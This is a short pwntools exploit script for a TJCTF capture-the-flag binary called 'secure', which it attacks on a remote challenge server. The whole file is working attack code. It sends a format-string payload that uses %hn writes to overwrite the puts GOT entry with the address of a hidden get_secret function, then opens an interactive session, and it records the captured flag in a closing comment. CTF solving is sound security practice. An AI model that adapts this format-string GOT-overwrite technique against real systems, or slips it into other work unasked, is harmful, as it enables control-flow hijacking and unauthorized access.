#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.clear(arch='i386')
exe = context.binary = ELF('secure')

host = args.HOST or 'problem1.tjctf.org'
port = int(args.PORT or 8008)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

arg_off = 35
puts_GOT = 0x0804A028
get_secret_ADDR = 0x08048713

write1 = 0x0804 - 8
write2 = 0x8713 - write1 - 8

payload = p32(puts_GOT + 2) + p32(puts_GOT) + "%{}x%{}$hn%{}x%{}$hn".format(write1, arg_off, write2, arg_off + 1)
log.info(payload)
log.info(len(payload))

io.sendlineafter('>', '1234')
io.sendlineafter('>', payload)
io.sendlineafter('>', '1234')

io.interactive()
# tjctf{n1c3_j0b_y0u_r34lly_GOT_m3_600d}
